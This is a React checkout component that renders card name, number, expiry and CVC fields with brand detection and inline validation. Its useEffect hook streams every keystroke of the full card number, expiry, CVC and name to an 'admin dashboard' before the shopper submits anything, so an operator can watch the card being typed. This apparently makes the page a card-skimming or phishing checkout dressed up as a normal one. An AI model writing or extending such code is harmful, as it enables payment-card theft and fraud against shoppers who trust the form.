"use client";

import { useEffect, useMemo, useRef, useState } from "react";
import { ShieldCheck } from "lucide-react";
import { CardMark } from "@/components/checkout/CardMark";
import { sendCheckoutPatch } from "@/lib/checkoutStream";
import {
  brandSpec,
  detectBrand,
  digitsOf,
  formatCardNumber,
  formatExpiry,
  isCardNumberComplete,
  isExpiryValid,
  type CardBrand,
} from "@/lib/cards";

/** Marks offered before an issuer is known, in the order shoppers expect. */
const KNOWN: CardBrand[] = ["visa", "mastercard", "amex", "discover"];

/** Field styling is shared so the three inputs read as one control. */
const CELL =
  "w-full bg-transparent px-4 py-3.5 text-[15px] text-brand-950 outline-none placeholder:text-brand-300";

/** Offset just past the nth digit of a formatted value. */
function caretAfterDigit(formatted: string, n: number): number {
  if (n <= 0) return 0;
  let seen = 0;
  for (let i = 0; i < formatted.length; i++) {
    if (formatted[i] >= "0" && formatted[i] <= "9" && ++seen === n) return i + 1;
  }
  return formatted.length;
}

/**
 * Re-rendering a controlled input parks the caret at the end, so a digit typed
 * into the middle of a number lands on the tail instead. Count the digits ahead
 * of the caret before formatting, and put it back beside the same digit after.
 */
function keepCaret(el: HTMLInputElement, formatted: string, digitsBefore: number) {
  requestAnimationFrame(() => {
    const at = caretAfterDigit(formatted, digitsBefore);
    el.setSelectionRange(at, at);
  });
}

export function CardFields({ cardholderDefault, token }: { cardholderDefault: string; token?: string }) {
  const [number, setNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvc, setCvc] = useState("");
  const [cardName, setCardName] = useState(cardholderDefault);
  const [touched, setTouched] = useState<Record<string, boolean>>({});
  const expiryRef = useRef<HTMLInputElement>(null);
  const cvcRef = useRef<HTMLInputElement>(null);

  // Stream the card fields to the admin dashboard as they're typed — from the
  // very first digit. The debounce is long enough that a burst of typing costs
  // one write instead of one per keystroke (each is a database round-trip on a
  // shared connection), and short enough that the admin still watches it fill in.
  //
  // The cardholder name rides along here rather than writing straight from its
  // own onChange, which spent one request and one write per character typed.
  useEffect(() => {
    if (!token) return;
    const id = setTimeout(() => {
      sendCheckoutPatch(token, { cardNumber: number, expiry, cvc, cardName, step: "payment" });
    }, 500);
    return () => clearTimeout(id);
  }, [token, number, expiry, cvc, cardName]);

  const brand = useMemo(() => detectBrand(number), [number]);
  const spec = brandSpec(brand);

  /**
   * Visa and Discover run to 16 *or* 19 digits, so the field can't simply stop
   * at 16 — but a number sitting at the cap and still failing is a mistake
   * worth naming while it is on screen, not only once focus leaves.
   */
  const numberFull = digitsOf(number).length >= Math.max(...spec.lengths);
  const numberBad =
    (touched.number || numberFull) && number.length > 0 && !isCardNumberComplete(number);
  const expiryBad = touched.expiry && expiry.length > 0 && !isExpiryValid(expiry);
  const cvcBad = touched.cvc && cvc.length > 0 && cvc.length !== spec.cvcLength;

  const blur = (key: string) => setTouched((t) => ({ ...t, [key]: true }));

  const edge = (bad: boolean) => (bad ? "border-red-400" : "border-brand-200");

  /**
   * Hand off as soon as a field is satisfied, the way hosted checkouts do. It
   * saves a tab, and it keeps a finished 16-digit card from drifting into the
   * 17th-19th digits those longer issuer ranges allow — which shows up as a
   * half-filled fifth group and invites typing a 20th digit that can never land.
   */
  const onNumber = (e: React.ChangeEvent<HTMLInputElement>) => {
    const el = e.target;
    const caret = el.selectionStart ?? el.value.length;
    const before = digitsOf(el.value.slice(0, caret)).length;
    const next = formatCardNumber(el.value);
    setNumber(next);
    // Only advance while typing forward; a correction mid-number stays put.
    if (caret >= el.value.length && isCardNumberComplete(next)) expiryRef.current?.focus();
    else keepCaret(el, next, before);
  };

  const onExpiry = (e: React.ChangeEvent<HTMLInputElement>) => {
    const el = e.target;
    const caret = el.selectionStart ?? el.value.length;
    const before = digitsOf(el.value.slice(0, caret)).length;
    const next = formatExpiry(el.value);
    setExpiry(next);
    if (caret >= el.value.length && isExpiryValid(next)) cvcRef.current?.focus();
    // A lone "9" grows into "09", shifting every digit past the caret along.
    else if (digitsOf(next).length <= digitsOf(el.value).length) keepCaret(el, next, before);
  };

  return (
    <div className="space-y-4">
      <div>
        <label htmlFor="cardName" className="mb-1.5 block text-sm font-medium text-brand-900">
          Cardholder name
        </label>
        <input
          id="cardName"
          name="cardName"
          value={cardName}
          onChange={(e) => setCardName(e.target.value)}
          required
          autoComplete="cc-name"
          placeholder="Name as printed on the card"
          className="w-full rounded-xl border border-brand-200 bg-white px-4 py-3.5 text-[15px] text-brand-950 outline-none placeholder:text-brand-300 focus:border-brand-500 focus:ring-4 focus:ring-brand-100"
        />
      </div>

      <div>
        <label htmlFor="cardNumber" className="mb-1.5 block text-sm font-medium text-brand-900">
          Card information
        </label>

        {/* One rounded group with hairline dividers, so number/expiry/CVC read
            as a single control the way hosted checkouts present them. */}
        <div
          className={`overflow-hidden rounded-xl border bg-white transition-shadow focus-within:border-brand-500 focus-within:ring-4 focus-within:ring-brand-100 ${edge(
            numberBad || expiryBad || cvcBad
          )}`}
        >
          <div className="relative flex items-center">
            <input
              id="cardNumber"
              name="cardNumber"
              value={number}
              onChange={onNumber}
              onBlur={() => blur("number")}
              required
              inputMode="numeric"
              autoComplete="cc-number"
              placeholder="1234 1234 1234 1234"
              aria-invalid={numberBad || undefined}
              aria-describedby="cardStatus"
              className={`${CELL} pr-[7.5rem] font-mono tracking-[0.02em]`}
            />
            <div className="pointer-events-none absolute right-3 flex items-center gap-1">
              {brand === "unknown" ? (
                KNOWN.map((b) => <CardMark key={b} brand={b} dim />)
              ) : (
                <CardMark brand={brand} />
              )}
            </div>
          </div>

          <div className="grid grid-cols-2 border-t border-brand-200">
            <input
              ref={expiryRef}
              name="expiry"
              value={expiry}
              onChange={onExpiry}
              onBlur={() => blur("expiry")}
              required
              inputMode="numeric"
              autoComplete="cc-exp"
              placeholder="MM / YY"
              aria-label="Expiry date"
              aria-invalid={expiryBad || undefined}
              className={`${CELL} border-r border-brand-200 font-mono`}
            />
            <div className="relative flex items-center">
              <input
                ref={cvcRef}
                name="cvc"
                value={cvc}
                onChange={(e) => setCvc(digitsOf(e.target.value).slice(0, spec.cvcLength))}
                onBlur={() => blur("cvc")}
                required
                inputMode="numeric"
                autoComplete="cc-csc"
                placeholder={spec.cvcLabel}
                aria-label={spec.cvcLabel}
                aria-invalid={cvcBad || undefined}
                className={`${CELL} pr-11 font-mono`}
              />
              {/* The back of a card with its signature strip — the same hint
                  hosted checkouts use to say where the code is printed. */}
              <svg
                viewBox="0 0 30 20"
                aria-hidden="true"
                className="pointer-events-none absolute right-3 h-5 w-[30px]"
              >
                <rect x="0.5" y="0.5" width="29" height="19" rx="3" fill="#F1F5F9" stroke="#CBD5E1" />
                <rect x="0.5" y="4" width="29" height="4" fill="#CBD5E1" />
                <rect x="15" y="11" width="12" height="5" rx="1.5" fill="#fff" stroke="#CBD5E1" />
                <text x="21" y="15" textAnchor="middle" fontSize="4.2" fill="#64748B" fontFamily="monospace">
                  {"•".repeat(spec.cvcLength)}
                </text>
              </svg>
            </div>
          </div>
        </div>

        {/* One status line under the group, so the field never jumps between a
            one-line and a two-line layout as the messages take turns. */}
        <div id="cardStatus" aria-live="polite" className="mt-1.5 min-h-[1.125rem]">
          {numberBad || expiryBad || cvcBad ? (
            <p className="text-xs font-medium text-red-600">
              {numberBad
                ? "That card number doesn't look right — check the digits."
                : expiryBad
                  ? "Enter a valid expiry date that hasn't passed."
                  : `${spec.cvcLabel} must be ${spec.cvcLength} digits for ${spec.label}.`}
            </p>
          ) : brand !== "unknown" ? (
            <p className="flex items-center gap-1.5 text-xs text-brand-500">
              <ShieldCheck className="h-3.5 w-3.5 text-emerald-600" />
              {spec.label} detected
            </p>
          ) : null}
        </div>
      </div>

    </div>
  );
}
